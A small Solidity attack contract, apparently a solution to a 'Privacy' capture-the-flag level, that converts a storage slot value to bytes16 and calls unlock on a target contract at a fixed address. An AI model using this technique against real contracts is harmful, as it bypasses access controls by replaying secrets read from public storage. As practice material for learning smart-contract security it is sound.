// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";


contract PrivacyAttack {

    Privacy target = Privacy(0x6F5464dBe91B84895015883E50B13C17342580A7);

    function unlock(bytes32 _dataSlot) public {
        // explicit type conversion
        bytes16 key = bytes16(_dataSlot);
        target.unlock(key);
    }

}